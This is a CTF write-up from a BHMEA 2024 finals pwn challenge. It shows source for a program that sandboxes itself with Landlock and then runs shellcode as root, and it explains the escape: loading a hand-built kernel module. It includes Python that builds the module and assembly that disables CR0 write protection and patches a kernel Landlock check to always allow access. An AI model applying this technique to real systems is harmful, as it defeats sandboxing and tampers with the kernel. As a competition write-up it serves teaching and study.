@@ -1,0 +1,245 @@
+# landlock
+
+In 2024 I placed 7th in BHMEA qualifiers with DeadSec, so we had paid accommodation for finals. The finals had A SINGLE PWN challenge on day 3 of finals (we got scammed since there were around 7 web challenges iirc). But I did first blood this challenge and it was pretty fun to solve.
+
+## background
+
+This challenge revolves around the linux landlock api. Landlock was first introduced in linux 5.13 and is used to restrict the actions of processes. Landlock currently allows control of the following rules:
+
+```c open
+LANDLOCK_ACCESS_FS_EXECUTE
+LANDLOCK_ACCESS_FS_WRITE_FILE
+LANDLOCK_ACCESS_FS_READ_FILE
+LANDLOCK_ACCESS_FS_READ_DIR
+LANDLOCK_ACCESS_FS_REMOVE_DIR
+LANDLOCK_ACCESS_FS_REMOVE_FILE
+LANDLOCK_ACCESS_FS_MAKE_CHAR
+LANDLOCK_ACCESS_FS_MAKE_DIR
+LANDLOCK_ACCESS_FS_MAKE_REG
+LANDLOCK_ACCESS_FS_MAKE_SOCK
+LANDLOCK_ACCESS_FS_MAKE_FIFO
+LANDLOCK_ACCESS_FS_MAKE_BLOCK
+LANDLOCK_ACCESS_FS_MAKE_SYM
+LANDLOCK_ACCESS_FS_REFER
+LANDLOCK_ACCESS_FS_TRUNCATE
+LANDLOCK_ACCESS_NET_BIND_TCP
+LANDLOCK_ACCESS_NET_CONNECT_TCP
+LANDLOCK_ACCESS_FS_IOCTL_DEV
+```
+
+You can fairly fine grained control over whether a process can perform certain filesystem actions, which is useful for sandboxing. The source of the challenge is simple: it disables all filesystem access using landlock and then runs user supplied shellcode.
+
+## challenge exploration
+
+```c open
+#include <stdio.h>
+#include <linux/landlock.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
+static inline int landlock_create_ruleset(const struct landlock_ruleset_attr *const attr,
+                                         const size_t size,
+                                         const __u32 flags)
+{
+	return syscall(__NR_landlock_create_ruleset, attr, size, flags);
+}
+
+static inline int landlock_restrict_self(const int ruleset_fd,
+                                         const __u32 flags)
+{
+	return syscall(__NR_landlock_restrict_self, ruleset_fd, flags);
+}
+
+int main() {
+  int abi, err, ruleset_fd;
+  void (*shellcode)();
+
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+
+  struct landlock_ruleset_attr ruleset_attr = {
+    .handled_access_fs =
+        LANDLOCK_ACCESS_FS_EXECUTE |
+        LANDLOCK_ACCESS_FS_WRITE_FILE |
+        LANDLOCK_ACCESS_FS_READ_FILE |
+        LANDLOCK_ACCESS_FS_READ_DIR |
+        LANDLOCK_ACCESS_FS_REMOVE_DIR |
+        LANDLOCK_ACCESS_FS_REMOVE_FILE |
+        LANDLOCK_ACCESS_FS_MAKE_CHAR |
+        LANDLOCK_ACCESS_FS_MAKE_DIR |
+        LANDLOCK_ACCESS_FS_MAKE_REG |
+        LANDLOCK_ACCESS_FS_MAKE_SOCK |
+        LANDLOCK_ACCESS_FS_MAKE_FIFO |
+        LANDLOCK_ACCESS_FS_MAKE_BLOCK |
+        LANDLOCK_ACCESS_FS_MAKE_SYM |
+        LANDLOCK_ACCESS_FS_REFER |
+        LANDLOCK_ACCESS_FS_TRUNCATE
+  };
+
+  abi = landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION);
+  if (abi < 0) {
+    perror("The running kernel does not enable to use Landlock");
+    return 1;
+  }
+  printf("abi version: %d\n", abi);
+
+  switch (abi) {
+    case 1:
+      ruleset_attr.handled_access_fs &= ~LANDLOCK_ACCESS_FS_REFER;
+      __attribute__((fallthrough));
+    case 2:
+      ruleset_attr.handled_access_fs &= ~LANDLOCK_ACCESS_FS_TRUNCATE;
+  }
+
+  ruleset_fd = landlock_create_ruleset(&ruleset_attr, sizeof(ruleset_attr), 0);
+  if (ruleset_fd < 0) {
+    perror("Failed to create a ruleset");
+    return 1;
+  }
+
+  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
+    perror("Failed to restrict privileges");
+    close(ruleset_fd);
+    return 1;
+  }
+
+  if (landlock_restrict_self(ruleset_fd, 0)) {
+    perror("Failed to enforce ruleset");
+    close(ruleset_fd);
+    return 1;
+  }
+
+  close(ruleset_fd);
+
+  shellcode = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC,
+                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  if ((void*)shellcode == MAP_FAILED) {
+    perror("Failed to create a memory map");
+    return 1;
+  }
+
+  printf("Shellcode: ");
+  for (size_t i = 0; i < 0x10000; i++)
+    if (scanf("%02hhx", (unsigned char*)shellcode + i) != 1)
+      break;
+
+  shellcode();
+
+  return 0;
+}
+```
+
+The challenge binary is run inside qemu and is the only service executed during init. We are not given a shell inside qemu. It is however running as root, but since landlock has restricted our filesystem access we cannot open the flag. The solution to escaping the sandbox is actually quite simple: load a kernel driver. Our shellcode is running with root permissions, and has the necessary capability to load kernel drivers.
+
+The signature for the syscall to load a kernel driver looks like this:
+```c open
+int init_module(void module_image[.size], unsigned long size, const char *param_values);
+```
+
+It doesn't read the contents of the lkm from a file, but from a userland buffer. This is perfect for this challenge since we can embed the kernel module inside our shellcode payload and then load it into the kernel. I realized this escape method immediately and that helped me to blood the challenge. I had actually considered this method of sandbox escape while writing a previous challenge which involved golfing a linux kernel module (See [kernel-module-golf](https://github.com/idekctf/idekctf-2024/tree/main/pwn/kernel-module-golf/challenge) from idekctf 2024). It was also pretty amusing to me that my previous seemingly useless research on hand crafting lkms would actually be useful at bhmea finals. While in this challenge you didn't need to produce a golfed kernel module I didn't realize this until after the ctf had ended, and would have probably saved me a few hours.
+
+## generating a lkm
+
+In order for a lkm to pass the checks in the kernel it needs to have a `.modinfo` section that matches the version information of the running kernel and valid init entrypoint. `.modinfo` is easy single it is a null byte separated list of key value pairs, with each key value pair separated by an equal sign.
+
+```py open
+modinfo.bname = b".modinfo"
+modinfo.type = SHT_PROGBITS
+modinfo.flags = SHF_ALLOC
+modinfo.content = \
+b"""vermagic=6.10.9 SMP preempt mod_unload \x00license=\x00"""
+```
+
+A kernel module init method is stored as a function pointer inside of its `this_module` structure, and is relocated at runtime because the lkm doesn't know where it will be loaded in memory.
+
+```py open
+symtab.bname = b"symtab"
+symtab.type = SHT_SYMTAB
+symtab.link = 3
+symtab.entrysize = sizeof(elf.Symbol)
+symtab.info = 2
+
+init_module = elf.Symbol()
+init_module.name = 1
+init_module.section_index = 6
+init_module.value = 0
+init_module.info = 0x10
+
+symtab.content = b"" + elf.Symbol() + init_module
+
+strtab.bname = b"strtab"
+strtab.type = SHT_STRTAB
+strtab.content = b"\x00init_module\x00"
+
+this_module.bname = b".gnu.linkonce.this_module"
+this_module.type = SHT_PROGBITS
+this_module.flags = SHF_ALLOC | SHF_WRITE
+this_module.content = rng.section_content(rng.section_from_name(b".gnu.linkonce.this_module"))
+this_module.content[0x18:0x20] = b"MEOW".ljust(8, b"\x00")
+
+this_module_rela.bname = b"tmr"
+this_module_rela.type = SHT_RELA
+this_module_rela.link = 2
+this_module_rela.info = 4
+this_module_rela.entrysize = sizeof(elf.Reloca)
+this_module_rela.content = bytearray()
+
+init_module_rela = elf.Reloca()
+init_module_rela.offset = 0x138
+init_module_rela.sym = 1
+init_module_rela.type = R_X86_64_64
+```
+
+Since we don't have the kernel config on hand, we don't know the offset of the `init` field in `this_module`. However since the rootfs contains other kernel modules, we can inspect them to determine what the correct offset should be. After that all that is needed is to add the code to the lkm that will run at ring 0 and escape the sandbox.
+
+```py open
+text.bname = b"text"
+text.type = SHT_PROGBITS
+text.flags = SHF_ALLOC | SHF_EXECINSTR
+text.content = asm(
+"""
+    push rax
+    push rbx
+    push rcx
+    push rdx
+    push rbp
+
+    mov rax, cr0
+    and rax, ~(1 << 16)
+    mov cr0, rax
+
+    mov ecx, 0xc0000082
+    rdmsr
+
+    shl rdx, 32
+    or rax, rdx
+    mov rbp, rax
+
+    lea rdx, [rbp - 0x53e5a0]
+    mov dword ptr [rdx], 0xc3c031
+
+    pop rbp
+    pop rdx
+    pop rcx
+    pop rbx
+    pop rax
+    ret
+""")
+```
+
+I decided that the easiest method was to patch the functions that check landlock rules to always allow access. This is done by disabling the write protect bit in cr0 to allow modification of read only pages, then patching the entrypoint of the kernel function to always return 0.
+
+### easier solution
+
+The much easier (and faster) solution is to take one of the existing kernel modules and patching the init entrypoint with new shellcode instead of writing code to generate a lkm during a very time sensitive ctf... In the end it didn't matter since they ONLY RELEASED ONE PWN CHAL.
+
+## solve scripts
+
+```py open path="lkm.py"
+```
+
+
+```c path="solve.py"
+```
